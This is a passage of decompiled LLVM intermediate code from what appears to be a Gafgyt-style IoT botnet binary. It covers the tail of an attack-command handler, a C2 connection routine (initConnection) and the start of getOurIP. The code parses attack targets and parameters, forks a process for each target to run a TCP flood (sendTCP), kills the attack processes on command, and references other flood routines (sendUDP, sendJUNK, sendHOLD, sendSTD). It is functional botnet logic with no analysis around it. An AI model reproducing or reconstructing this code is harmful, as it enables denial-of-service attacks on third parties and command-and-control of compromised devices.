  %v7_12954 = icmp eq i32 %v1_1294c, -1
  br i1 %v7_12954, label %dec_label_pc_12d7c, label %dec_label_pc_1295c

dec_label_pc_1295c:                               ; preds = %dec_label_pc_1293c
  %v1_12960 = add i32 %tmp, 16
  %v1_12964 = inttoptr i32 %v1_12960 to i32*
  %v2_12964 = load i32, i32* %v1_12964, align 4
  store i32 %v2_12964, i32* @r0, align 4
  %v1_1296c = call i32 @atol(i32 %v2_12964)
  %v7_12974 = icmp eq i32 %v1_1296c, -1
  br i1 %v7_12974, label %dec_label_pc_12d7c, label %dec_label_pc_1297c

dec_label_pc_1297c:                               ; preds = %dec_label_pc_1295c
  %v2_12984 = load i32, i32* %v1_12964, align 4
  store i32 %v2_12984, i32* @r0, align 4
  %v1_1298c = call i32 @atol(i32 %v2_12984)
  %v8_12998 = icmp sgt i32 %v1_1298c, 32
  br i1 %v8_12998, label %dec_label_pc_12d7c, label %dec_label_pc_1299c

dec_label_pc_1299c:                               ; preds = %dec_label_pc_1297c
  %v7_129a4 = icmp slt i32 %arg1, 7
  br i1 %v7_129a4, label %dec_label_pc_129c8, label %dec_label_pc_129a8

dec_label_pc_129a8:                               ; preds = %dec_label_pc_1299c
  %v1_129ac = add i32 %tmp, 24
  %v1_129b0 = inttoptr i32 %v1_129ac to i32*
  %v2_129b0 = load i32, i32* %v1_129b0, align 4
  store i32 %v2_129b0, i32* @r0, align 4
  %v1_129b8 = call i32 @atol(i32 %v2_129b0)
  %v1_129c0 = icmp slt i32 %v1_129b8, 0
  br i1 %v1_129c0, label %dec_label_pc_12d7c, label %dec_label_pc_129c8

dec_label_pc_129c8:                               ; preds = %dec_label_pc_129a8, %dec_label_pc_1299c
  %v7_129cc = icmp eq i32 %arg1, 8
  br i1 %v7_129cc, label %dec_label_pc_129d4, label %dec_label_pc_12a74

dec_label_pc_129d4:                               ; preds = %dec_label_pc_129c8
  %v1_129d8 = add i32 %tmp, 28
  %v1_129dc = inttoptr i32 %v1_129d8 to i32*
  %v2_129dc = load i32, i32* %v1_129dc, align 4
  store i32 %v2_129dc, i32* @r0, align 4
  %v1_129e4 = call i32 @atol(i32 %v2_129dc)
  %v5_129f0 = icmp sgt i32 %v1_129e4, 0
  br i1 %v5_129f0, label %dec_label_pc_12a74, label %dec_label_pc_12d7c

dec_label_pc_12a74:                               ; preds = %dec_label_pc_129c8, %dec_label_pc_129d4
  %v1_12a78 = add i32 %tmp, 4
  %v1_12a7c = inttoptr i32 %v1_12a78 to i32*
  %v2_12a7c = load i32, i32* %v1_12a7c, align 4
  %v2_12a8c = load i32, i32* %v1_12944, align 4
  store i32 %v2_12a8c, i32* @r0, align 4
  %v1_12a94 = call i32 @atol(i32 %v2_12a8c)
  %v2_12aa8 = load i32, i32* %v1_12924, align 4
  store i32 %v2_12aa8, i32* @r0, align 4
  %v1_12ab0 = call i32 @atol(i32 %v2_12aa8)
  %v2_12ac4 = load i32, i32* %v1_12964, align 4
  store i32 %v2_12ac4, i32* @r0, align 4
  %v1_12acc = call i32 @atol(i32 %v2_12ac4)
  %v1_12adc = add i32 %tmp, 20
  %v1_12ae0 = inttoptr i32 %v1_12adc to i32*
  %v2_12ae0 = load i32, i32* %v1_12ae0, align 4
  br i1 %v7_129cc, label %dec_label_pc_12af4, label %dec_label_pc_12b10

dec_label_pc_12af4:                               ; preds = %dec_label_pc_12a74
  %v1_12af8 = add i32 %tmp, 28
  %v1_12afc = inttoptr i32 %v1_12af8 to i32*
  %v2_12afc = load i32, i32* %v1_12afc, align 4
  store i32 %v2_12afc, i32* @r0, align 4
  %v1_12b04 = call i32 @atol(i32 %v2_12afc)
  br label %dec_label_pc_12b18

dec_label_pc_12b10:                               ; preds = %dec_label_pc_12a74
  br label %dec_label_pc_12b18

dec_label_pc_12b18:                               ; preds = %dec_label_pc_12af4, %dec_label_pc_12b10
  %storemerge3 = phi i32 [ 10, %dec_label_pc_12b10 ], [ %v1_12b04, %dec_label_pc_12af4 ]
  br i1 %v7_129a4, label %dec_label_pc_12b48, label %dec_label_pc_12b2c

dec_label_pc_12b2c:                               ; preds = %dec_label_pc_12b18
  %v1_12b30 = add i32 %tmp, 24
  %v1_12b34 = inttoptr i32 %v1_12b30 to i32*
  %v2_12b34 = load i32, i32* %v1_12b34, align 4
  store i32 %v2_12b34, i32* @r0, align 4
  %v1_12b3c = call i32 @atol(i32 %v2_12b34)
  br label %dec_label_pc_12b50

dec_label_pc_12b48:                               ; preds = %dec_label_pc_12b18
  br label %dec_label_pc_12b50

dec_label_pc_12b50:                               ; preds = %dec_label_pc_12b2c, %dec_label_pc_12b48
  %storemerge2 = phi i32 [ 0, %dec_label_pc_12b48 ], [ %v1_12b3c, %dec_label_pc_12b2c ]
  store i32 %v2_12a7c, i32* @r0, align 4
  %v2_12b64 = call i32 @__GI_strchr(i32 %v2_12a7c, i32 44)
  %v2_12b6c = icmp eq i32 %v2_12b64, 0
  br i1 %v2_12b6c, label %dec_label_pc_12bf8, label %dec_label_pc_12b74

dec_label_pc_12b74:                               ; preds = %dec_label_pc_12b50
  %v2_12b80 = call i32 @__GI_strtok(i32 %v2_12a7c, i32 ptrtoint (i32* @global_var_27f94.1195 to i32))
  %v2_12bec30 = icmp eq i32 %v2_12b80, 0
  br i1 %v2_12bec30, label %dec_label_pc_12c3c, label %dec_label_pc_12b90

dec_label_pc_12b90:                               ; preds = %dec_label_pc_12b74, %dec_label_pc_12bd4
  %storemerge1431 = phi i32 [ %v2_12bdc, %dec_label_pc_12bd4 ], [ %v2_12b80, %dec_label_pc_12b74 ]
  %v0_12b90 = call i32 @listFork()
  %v2_12b98 = icmp eq i32 %v0_12b90, 0
  br i1 %v2_12b98, label %dec_label_pc_12ba0, label %dec_label_pc_12bd4

dec_label_pc_12ba0:                               ; preds = %dec_label_pc_12b90
  %v7_12bc8 = call i32 @sendTCP(i32 %storemerge1431, i32 %v1_12a94, i32 %v1_12ab0, i32 %v1_12acc, i32 %v2_12ae0, i32 %storemerge2, i32 %storemerge3)
  %v1_12bd0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_12bd4

dec_label_pc_12bd4:                               ; preds = %dec_label_pc_12b90, %dec_label_pc_12ba0
  %v2_12bdc = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_27f94.1195 to i32))
  %v2_12bec = icmp eq i32 %v2_12bdc, 0
  br i1 %v2_12bec, label %dec_label_pc_12c3c, label %dec_label_pc_12b90

dec_label_pc_12bf8:                               ; preds = %dec_label_pc_12b50
  %v0_12bf8 = call i32 @listFork()
  %v2_12c00 = icmp eq i32 %v0_12bf8, 0
  br i1 %v2_12c00, label %dec_label_pc_12c08, label %dec_label_pc_12d7c

dec_label_pc_12c08:                               ; preds = %dec_label_pc_12bf8
  %v7_12c30 = call i32 @sendTCP(i32 %v2_12a7c, i32 %v1_12a94, i32 %v1_12ab0, i32 %v1_12acc, i32 %v2_12ae0, i32 %storemerge2, i32 %storemerge3)
  %v1_12c38 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_12c3c

dec_label_pc_12c3c:                               ; preds = %dec_label_pc_12bd4, %dec_label_pc_12b74, %dec_label_pc_128f0, %dec_label_pc_12c08
  %v2_12c40 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_2808c.1259 to i32), i32* @r1, align 4
  %v3_12c4c = inttoptr i32 %v2_12c40 to i8*
  %v4_12c4c = call i32 @__GI_strcoll(i8* %v3_12c4c, i32 ptrtoint ([5 x i8]* @global_var_2808c.1259 to i32))
  %v2_12c54 = icmp eq i32 %v4_12c4c, 0
  br i1 %v2_12c54, label %dec_label_pc_12c5c, label %dec_label_pc_12d54

dec_label_pc_12c5c:                               ; preds = %dec_label_pc_12c3c
  br label %dec_label_pc_12d00

dec_label_pc_12c70:                               ; preds = %dec_label_pc_12d00, %dec_label_pc_12d34
  %v3_12c74 = mul i32 %storemerge12, 4
  %v2_12c80 = load i32, i32* @global_var_391f4.68, align 4
  %v2_12c84 = add i32 %v2_12c80, %v3_12c74
  %v1_12c88 = inttoptr i32 %v2_12c84 to i32*
  %v2_12c88 = load i32, i32* %v1_12c88, align 4
  %v2_12c8c = icmp eq i32 %v2_12c88, 0
  br i1 %v2_12c8c, label %dec_label_pc_12cf4, label %dec_label_pc_12c94

dec_label_pc_12c94:                               ; preds = %dec_label_pc_12c70
  %v2_12cac = load i32, i32* %v1_12c88, align 4
  %v0_12cb0 = call i32 @__getpid()
  %v9_12cb8 = icmp eq i32 %v2_12cac, %v0_12cb0
  br i1 %v9_12cb8, label %dec_label_pc_12cf4, label %dec_label_pc_12cc0

dec_label_pc_12cc0:                               ; preds = %dec_label_pc_12c94
  %v2_12cd0 = load i32, i32* @global_var_391f4.68, align 4
  %v2_12cd4 = add i32 %v2_12cd0, %v3_12c74
  %v1_12cd8 = inttoptr i32 %v2_12cd4 to i32*
  %v2_12cd8 = load i32, i32* %v1_12cd8, align 4
  %v2_12ce4 = call i32 @kill(i32 %v2_12cd8, i32 9)
  %v1_12cec = add i32 %stack_var_-48.1, 1
  br label %dec_label_pc_12cf4

dec_label_pc_12cf4:                               ; preds = %dec_label_pc_12c94, %dec_label_pc_12c70, %dec_label_pc_12cc0
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.1, %dec_label_pc_12c70 ], [ %stack_var_-48.1, %dec_label_pc_12c94 ], [ %v1_12cec, %dec_label_pc_12cc0 ]
  %v1_12cf8 = add i32 %storemerge12, 1
  br label %dec_label_pc_12d00

dec_label_pc_12d00:                               ; preds = %dec_label_pc_12c5c, %dec_label_pc_12cf4
  %stack_var_-48.1 = phi i32 [ 0, %dec_label_pc_12c5c ], [ %stack_var_-48.0, %dec_label_pc_12cf4 ]
  %storemerge12 = phi i32 [ 0, %dec_label_pc_12c5c ], [ %v1_12cf8, %dec_label_pc_12cf4 ]
  %v5_12d18 = load i32, i32* @global_var_324d4.66, align 4
  %v9_12d2c = icmp eq i32 %v5_12d18, 0
  br i1 %v9_12d2c, label %dec_label_pc_12d34, label %dec_label_pc_12c70

dec_label_pc_12d34:                               ; preds = %dec_label_pc_12d00
  %v2_12d18 = load i32, i32* @global_var_324d0.65, align 4
  %tmp119 = icmp ugt i32 %v2_12d18, %storemerge12
  br i1 %tmp119, label %dec_label_pc_12c70, label %dec_label_pc_12d54

dec_label_pc_12d54:                               ; preds = %dec_label_pc_12d34, %dec_label_pc_12c3c
  %v2_12d58 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_28094.1263 to i32), i32* @r1, align 4
  %v3_12d64 = inttoptr i32 %v2_12d58 to i8*
  %v4_12d64 = call i32 @__GI_strcoll(i8* %v3_12d64, i32 ptrtoint ([12 x i8]* @global_var_28094.1263 to i32))
  %v2_12d6c = icmp eq i32 %v4_12d64, 0
  br i1 %v2_12d6c, label %dec_label_pc_12d74, label %dec_label_pc_12d7c

dec_label_pc_12d74:                               ; preds = %dec_label_pc_12d54
  %v1_12d78 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_12d7c

dec_label_pc_12d7c:                               ; preds = %dec_label_pc_129d4, %dec_label_pc_127d8, %dec_label_pc_12624, %dec_label_pc_124b0, %dec_label_pc_120bc, %dec_label_pc_11e94, %dec_label_pc_11d30, %dec_label_pc_11e20, %dec_label_pc_11f94, %dec_label_pc_12230, %dec_label_pc_123b4, %dec_label_pc_125b0, %dec_label_pc_12744, %dec_label_pc_128c8, %dec_label_pc_12bf8, %dec_label_pc_12d54, %dec_label_pc_11c94, %dec_label_pc_11c24, %dec_label_pc_129a8, %dec_label_pc_1297c, %dec_label_pc_1295c, %dec_label_pc_1293c, %dec_label_pc_1291c, %dec_label_pc_12910, %dec_label_pc_127b8, %dec_label_pc_127ac, %dec_label_pc_12604, %dec_label_pc_125f8, %dec_label_pc_12490, %dec_label_pc_12484, %dec_label_pc_1228c, %dec_label_pc_12090, %dec_label_pc_12068, %dec_label_pc_12048, %dec_label_pc_12028, %dec_label_pc_12008, %dec_label_pc_11fe8, %dec_label_pc_11fdc, %dec_label_pc_11e74, %dec_label_pc_11e68, %dec_label_pc_11d10, %dec_label_pc_11d04, %dec_label_pc_11bbc, %dec_label_pc_11c4c, %dec_label_pc_11b80, %dec_label_pc_11a84, %dec_label_pc_11a4c, %dec_label_pc_12d74
  %v1_12d84 = phi i32 [ %v1_129e4, %dec_label_pc_129d4 ], [ %v1_127e8, %dec_label_pc_127d8 ], [ %v1_12634, %dec_label_pc_12624 ], [ %v1_124c0, %dec_label_pc_124b0 ], [ %v1_120cc, %dec_label_pc_120bc ], [ %v1_11ea4, %dec_label_pc_11e94 ], [ %v1_11d40, %dec_label_pc_11d30 ], [ %v0_11e20, %dec_label_pc_11e20 ], [ %v0_11f94, %dec_label_pc_11f94 ], [ %v0_12230, %dec_label_pc_12230 ], [ %v0_123b4, %dec_label_pc_123b4 ], [ %v0_125b0, %dec_label_pc_125b0 ], [ %v0_12744, %dec_label_pc_12744 ], [ %v0_128c8, %dec_label_pc_128c8 ], [ %v0_12bf8, %dec_label_pc_12bf8 ], [ %v4_12d64, %dec_label_pc_12d54 ], [ 0, %dec_label_pc_11c94 ], [ 0, %dec_label_pc_11c24 ], [ %v1_129b8, %dec_label_pc_129a8 ], [ %v1_1298c, %dec_label_pc_1297c ], [ %v1_1296c, %dec_label_pc_1295c ], [ %v1_1294c, %dec_label_pc_1293c ], [ %v1_1292c, %dec_label_pc_1291c ], [ 0, %dec_label_pc_12910 ], [ %v1_127c8, %dec_label_pc_127b8 ], [ 0, %dec_label_pc_127ac ], [ %v1_12614, %dec_label_pc_12604 ], [ 0, %dec_label_pc_125f8 ], [ %v1_124a0, %dec_label_pc_12490 ], [ 0, %dec_label_pc_12484 ], [ 0, %dec_label_pc_1228c ], [ %v1_120a0, %dec_label_pc_12090 ], [ %v1_12078, %dec_label_pc_12068 ], [ %v1_12058, %dec_label_pc_12048 ], [ %v1_12038, %dec_label_pc_12028 ], [ %v1_12018, %dec_label_pc_12008 ], [ %v1_11ff8, %dec_label_pc_11fe8 ], [ 0, %dec_label_pc_11fdc ], [ %v1_11e84, %dec_label_pc_11e74 ], [ 0, %dec_label_pc_11e68 ], [ %v1_11d20, %dec_label_pc_11d10 ], [ 0, %dec_label_pc_11d04 ], [ 0, %dec_label_pc_11bbc ], [ %v0_11c34, %dec_label_pc_11c4c ], [ %v3_11b90, %dec_label_pc_11b80 ], [ %v3_11aa8, %dec_label_pc_11a84 ], [ %v3_11a5c, %dec_label_pc_11a4c ], [ %v1_12d78, %dec_label_pc_12d74 ]
  store i32 %v3_11a18, i32* @r4, align 4
  store i32 %v6_11a18, i32* @r5, align 4
  store i32 %v9_11a18, i32* @r6, align 4
  store i32 %v12_11a18, i32* @r7, align 4
  store i32 %v15_11a18, i32* @r8, align 4
  store i32 %v18_11a18, i32* @fp, align 4
  ret i32 %v1_12d84

; uselistorder directives
  uselistorder i32 %stack_var_-48.1, { 0, 2, 1 }
  uselistorder i32 %v3_12c74, { 1, 0 }
  uselistorder i32 %v2_12bdc, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v1_12acc, { 1, 0 }
  uselistorder i32 %v1_12ab0, { 1, 0 }
  uselistorder i32 %v1_12a94, { 1, 0 }
  uselistorder i32 %v2_12a7c, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1296c, { 1, 0 }
  uselistorder i32 %v1_1294c, { 1, 0 }
  uselistorder i32 %v1_1292c, { 1, 0 }
  uselistorder i32 %v2_128ac, { 1, 0 }
  uselistorder i32 %v1_12838, { 1, 0 }
  uselistorder i32 %v1_1281c, { 1, 0 }
  uselistorder i32 %v2_12804, { 1, 0, 3, 2 }
  uselistorder i32 %v2_12728, { 1, 0 }
  uselistorder i32 %storemerge1837, { 2, 1, 0 }
  uselistorder i32 %v1_12684, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %v1_12668, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %v2_12650, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v2_12594, { 1, 0 }
  uselistorder i32 %v1_12510, { 1, 0 }
  uselistorder i32 %v1_124f4, { 1, 0 }
  uselistorder i32 %v2_124dc, { 1, 0, 3, 2 }
  uselistorder i32* %v1_122a0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_12214, { 1, 0 }
  uselistorder i32 %storemerge9, { 1, 0 }
  uselistorder i32 %v1_12138, { 1, 0 }
  uselistorder i32 %v1_1211c, { 1, 0 }
  uselistorder i32 %v1_12100, { 1, 0 }
  uselistorder i32 %v2_120e8, { 1, 0, 3, 2 }
  uselistorder i32 %v1_12058, { 1, 0 }
  uselistorder i32 %v1_12038, { 1, 0 }
  uselistorder i32 %v1_12018, { 1, 0 }
  uselistorder i32 %v1_11ff8, { 1, 0 }
  uselistorder i32 %v2_11f78, { 1, 0 }
  uselistorder i32 %v1_11ef4, { 1, 0 }
  uselistorder i32 %v1_11ed8, { 1, 0 }
  uselistorder i32 %v2_11ec0, { 1, 0, 3, 2 }
  uselistorder i32 %v2_11e04, { 1, 0 }
  uselistorder i32 %v1_11d90, { 1, 0 }
  uselistorder i32 %v1_11d74, { 1, 0 }
  uselistorder i32 %v2_11d5c, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 6, 7, 8, 9, 10, 5, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0, 1, 2, 3, 4, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendSTD, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sendCNC, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sendJUNK, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendHOLD, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_27f94.1195 to i32), { 7, 8, 6, 9, 5, 10, 4, 11, 3, 12, 2, 13, 1, 14, 0, 15, 16, 17 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_28034.1236 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32)* @kill, { 1, 0 }
  uselistorder i32* @global_var_391f0.1232, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_23a88.61 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_12d7c, { 47, 15, 14, 0, 18, 19, 20, 21, 22, 23, 13, 1, 24, 25, 12, 2, 26, 27, 11, 3, 28, 29, 10, 30, 9, 4, 31, 32, 33, 34, 35, 36, 37, 8, 5, 38, 39, 7, 6, 40, 41, 16, 43, 17, 42, 44, 45, 46 }
  uselistorder label %dec_label_pc_12d00, { 1, 0 }
  uselistorder label %dec_label_pc_12cf4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12c70, { 1, 0 }
  uselistorder label %dec_label_pc_12c3c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12bd4, { 1, 0 }
  uselistorder label %dec_label_pc_12b90, { 1, 0 }
  uselistorder label %dec_label_pc_12b50, { 1, 0 }
  uselistorder label %dec_label_pc_12b18, { 1, 0 }
  uselistorder label %dec_label_pc_12a74, { 1, 0 }
  uselistorder label %dec_label_pc_128f0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_128a4, { 1, 0 }
  uselistorder label %dec_label_pc_1287c, { 1, 0 }
  uselistorder label %dec_label_pc_1278c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12720, { 1, 0 }
  uselistorder label %dec_label_pc_126c8, { 1, 0 }
  uselistorder label %dec_label_pc_125d8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1258c, { 1, 0 }
  uselistorder label %dec_label_pc_12554, { 1, 0 }
  uselistorder label %dec_label_pc_12464, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12390, { 1, 0 }
  uselistorder label %dec_label_pc_122e0, { 1, 0 }
  uselistorder label %dec_label_pc_1226c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1220c, { 1, 0 }
  uselistorder label %dec_label_pc_121d0, { 1, 0 }
  uselistorder label %dec_label_pc_12190, { 1, 0 }
  uselistorder label %dec_label_pc_120e0, { 1, 0 }
  uselistorder label %dec_label_pc_11fbc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11f70, { 1, 0 }
  uselistorder label %dec_label_pc_11f38, { 1, 0 }
  uselistorder label %dec_label_pc_11e48, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11dfc, { 1, 0 }
  uselistorder label %dec_label_pc_11dd4, { 1, 0 }
  uselistorder label %dec_label_pc_11ce4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11c74, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11c00, { 1, 0 }
  uselistorder label %dec_label_pc_11b54, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11b04, { 2, 0, 1 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_12d8c = load i32, i32* @fp, align 4
  store i32 77204, i32* %stack_var_-4, align 4
  %v2_12d90 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_12d90, i32* @fp, align 4
  %v2_12da4 = ptrtoint i32* %stack_var_-4116 to i32
  %v3_12db4 = bitcast i32* %stack_var_-4116 to i8*
  %v4_12db4 = call i32 @__GI_memset(i8* %v3_12db4, i32 0, i32 4096)
  %v2_12dbc = load i32, i32* @global_var_324c8.59, align 4
  %v2_12dc0 = icmp eq i32 %v2_12dbc, 0
  br i1 %v2_12dc0, label %dec_label_pc_12de4, label %dec_label_pc_12dc8

dec_label_pc_12dc8:                               ; preds = %entry
  %v1_12dd4 = call i32 @__GI___libc_close(i32 %v2_12dbc)
  store i32 0, i32* @global_var_324c8.59, align 4
  br label %dec_label_pc_12de4

dec_label_pc_12de4:                               ; preds = %entry, %dec_label_pc_12dc8
  %v2_12de8 = load i32, i32* @global_var_32218.1266, align 4
  %v2_12dec = icmp eq i32 %v2_12de8, 0
  br i1 %v2_12dec, label %dec_label_pc_12e18, label %dec_label_pc_12e04

dec_label_pc_12e04:                               ; preds = %dec_label_pc_12de4
  %v1_12e0c = add i32 %v2_12de8, 1
  br label %dec_label_pc_12e18

dec_label_pc_12e18:                               ; preds = %dec_label_pc_12de4, %dec_label_pc_12e04
  %storemerge1 = phi i32 [ %v1_12e0c, %dec_label_pc_12e04 ], [ 0, %dec_label_pc_12de4 ]
  store i32 %storemerge1, i32* @global_var_32218.1266, align 4
  %v4_12e30 = mul i32 %storemerge1, 4
  %v5_12e30 = add i32 %v4_12e30, ptrtoint ([15 x i8]** @global_var_320e4.1269 to i32)
  %v6_12e30 = inttoptr i32 %v5_12e30 to i32*
  %v7_12e30 = load i32, i32* %v6_12e30, align 4
  store i32 %v7_12e30, i32* @r1, align 4
  %v3_12e3c = call i32 @strcpy(i8* %v3_12db4, i32 %v7_12e30)
  %v2_12e44 = load i32, i32* @global_var_320e8.1271, align 4
  store i32 %v2_12da4, i32* @r0, align 4
  %v2_12e60 = call i32 @__GI_strchr(i32 %v2_12da4, i32 58)
  %v2_12e68 = icmp eq i32 %v2_12e60, 0
  br i1 %v2_12e68, label %dec_label_pc_12ec8, label %dec_label_pc_12e70

dec_label_pc_12e70:                               ; preds = %dec_label_pc_12e18
  store i32 %v2_12da4, i32* @r0, align 4
  %v2_12e84 = call i32 @__GI_strchr(i32 %v2_12da4, i32 58)
  %v1_12e8c = add i32 %v2_12e84, 1
  store i32 %v1_12e8c, i32* @r0, align 4
  %v1_12e94 = call i32 @atol(i32 %v1_12e8c)
  store i32 %v2_12da4, i32* @r0, align 4
  %v2_12eb4 = call i32 @__GI_strchr(i32 %v2_12da4, i32 58)
  %v3_12ec4 = inttoptr i32 %v2_12eb4 to i8*
  store i8 0, i8* %v3_12ec4, align 1
  br label %dec_label_pc_12ec8

dec_label_pc_12ec8:                               ; preds = %dec_label_pc_12e18, %dec_label_pc_12e70
  %stack_var_-20.0 = phi i32 [ %v2_12e44, %dec_label_pc_12e18 ], [ %v1_12e94, %dec_label_pc_12e70 ]
  %v3_12ed4 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_12ed4, i32* @global_var_324c8.59, align 4
  %v4_12f08 = call i32 @connectTimeout(i32 %v3_12ed4, i32 %v2_12da4, i32 %stack_var_-20.0, i32 30)
  %v2_12f10 = icmp eq i32 %v4_12f08, 0
  %. = zext i1 %v2_12f10 to i32
  store i32 %v3_12d8c, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_12da4, { 4, 1, 0, 3, 2, 6, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_12ec8, { 1, 0 }
  uselistorder label %dec_label_pc_12e18, { 1, 0 }
  uselistorder label %dec_label_pc_12de4, { 1, 0 }
}

define i32 @getOurIP(i32 %arg1) local_unnamed_addr {
entry:
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12f60 = load i32, i32* @fp, align 4
  store i32 %v3_12f60, i32* %stack_var_-16, align 4
  %v3_12f7c = call i32 @socket(i32 2, i32 2, i32 0)
  %v3_12f8c = icmp eq i32 %v3_12f7c, -1
  br i1 %v3_12f8c, label %dec_label_pc_12f94, label %dec_label_pc_12fa4

dec_label_pc_12f94:                               ; preds = %entry
  br label %dec_label_pc_131e0

dec_label_pc_12fa4:                               ; preds = %entry
  %v2_12fa4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_12fb4 = bitcast i32* %stack_var_-52 to i8*
  %v4_12fb4 = call i32 @__GI_memset(i8* %v3_12fb4, i32 0, i32 16)
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_280a0.1273 to i32), i32* @r0, align 4
  %v2_12fc4 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_280a0.1273 to i32))
  %v1_12fd4 = call i32 @__GI_htons(i32 53)
  %v3_12ff0 = call i32 @__libc_connect(i32 %v3_12f7c, i32 %v2_12fa4, i32 16)
  %v3_13000 = icmp eq i32 %v3_12ff0, -1
  br i1 %v3_13000, label %dec_label_pc_13008, label %dec_label_pc_13018

dec_label_pc_13008:                               ; preds = %dec_label_pc_12fa4
  br label %dec_label_pc_131e0

dec_label_pc_13018:                               ; preds = %dec_label_pc_12fa4
  store i32 16, i32* %stack_var_-72, align 4
  %v2_13020 = ptrtoint i32* %stack_var_-68 to i32
  %v2_13024 = ptrtoint i32* %stack_var_-72 to i32
  %v5_13030 = call i32 @__GI_getsockname(i32 %v3_12f7c, i32 %v2_13020, i32 %v2_13024, i32 %v2_13020, i32 16)
  %v3_13040 = icmp eq i32 %v5_13030, -1
  br i1 %v3_13040, label %dec_label_pc_13048, label %dec_label_pc_13058

dec_label_pc_13048:                               ; preds = %dec_label_pc_13018
  br label %dec_label_pc_131e0

dec_label_pc_13058:                               ; preds = %dec_label_pc_13018
  store i32 %tmp19, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_391e8.487 to i32), i32* @r2, align 4
  store i32 %tmp19, i32* @global_var_391e8.487, align 4
  %v3_1306c = call i32 @__libc_open(i32 ptrtoint ([16 x i8]* @global_var_280a8.1276 to i32), i32 0)
  %v2_13104 = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_130fc

dec_label_pc_1307c:                               ; preds = %dec_label_pc_130fc
  %v4_13090 = call i32 @strstr(i32 %v2_13104, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_280b8.1278, i32 0, i32 0))
  %v2_13098 = icmp eq i32 %v4_13090, 0
  br i1 %v2_13098, label %dec_label_pc_130e0, label %dec_label_pc_130c0.preheader

dec_label_pc_130c0.preheader:                     ; preds = %dec_label_pc_1307c
  %v2_130c49 = load i8, i8* %stack_var_-4168, align 1
  %v7_130c813 = icmp eq i8 %v2_130c49, 9
  br i1 %v7_130c813, label %dec_label_pc_130d0, label %dec_label_pc_130b4

dec_label_pc_130b4:                               ; preds = %dec_label_pc_130c0.preheader, %dec_label_pc_130b4
  %v4_130c014 = phi i32 [ %v1_130b8, %dec_label_pc_130b4 ], [ %v2_13104, %dec_label_pc_130c0.preheader ]
  %v1_130b8 = add i32 %v4_130c014, 1
  %v5_130bc = inttoptr i32 %v1_130b8 to i8*
  %v2_130c4 = load i8, i8* %v5_130bc, align 1
  %v7_130c8 = icmp eq i8 %v2_130c4, 9
  br i1 %v7_130c8, label %dec_label_pc_130d0, label %dec_label_pc_130b4

dec_label_pc_130d0:                               ; preds = %dec_label_pc_130b4, %dec_label_pc_130c0.preheader
  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_130c0.preheader ], [ %v5_130bc, %dec_label_pc_130b4 ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_13124

dec_label_pc_130e0:                               ; preds = %dec_label_pc_1307c
